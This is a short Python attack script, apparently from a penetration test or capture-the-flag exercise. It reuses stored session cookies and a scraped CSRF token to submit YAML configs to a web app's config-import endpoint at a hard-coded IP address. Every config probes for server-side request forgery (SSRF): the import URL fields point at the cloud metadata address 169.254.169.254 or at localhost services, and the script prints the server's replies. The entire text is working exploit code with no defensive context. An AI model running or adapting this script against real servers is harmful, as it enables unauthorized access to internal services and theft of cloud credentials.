import requests, re, json, time
BASE='http://15.252.91.100'
s=requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
s.cookies.update(json.load(open('cn_cookies.json')))
def csrf(h): 
    m=re.search(r'name="csrfmiddlewaretoken" value="([^"]*)"',h); return m.group(1) if m else None

def submit(yaml_text, label=''):
    r=s.get(BASE+'/import/config/'); t=csrf(r.text)
    t0=time.time()
    r=s.post(BASE+'/import/config/', data={'csrfmiddlewaretoken':t,'yaml_config':yaml_text}, headers={'Referer':BASE+'/import/config/'})
    dt=time.time()-t0
    print(f'\n### {label}  ({dt:.2f}s, status {r.status_code})')
    for m in re.finditer(r'(class="alert[^"]*"[\s\S]{0,500}?</div>|<pre[\s\S]*?</pre>)', r.text):
        seg=re.sub(r'<[^>]+>',' ',m.group(0)); seg=re.sub(r'\s+',' ',seg).strip()
        seg=seg.replace('&#x27;',"'").replace('&quot;','"').replace('&amp;','&').replace('&lt;','<').replace('&gt;','>')
        if seg: print('  >', seg[:500])

configs = {
 'import_url as string':'features:\n  import_url: "http://169.254.169.254/latest/meta-data/"\n',
 'top import_url':'import_url: "http://127.0.0.1/"\n',
 'workspace import_url':'workspace:\n  import_url: "http://127.0.0.1:8000/"\n',
 'remote key':'remote:\n  url: "http://127.0.0.1/"\n',
 'source url':'source: "http://127.0.0.1:8000/api/profile/"\n',
 'config_url':'config_url: "http://127.0.0.1/"\n',
}
for lbl,cfg in configs.items():
    submit(cfg,lbl)
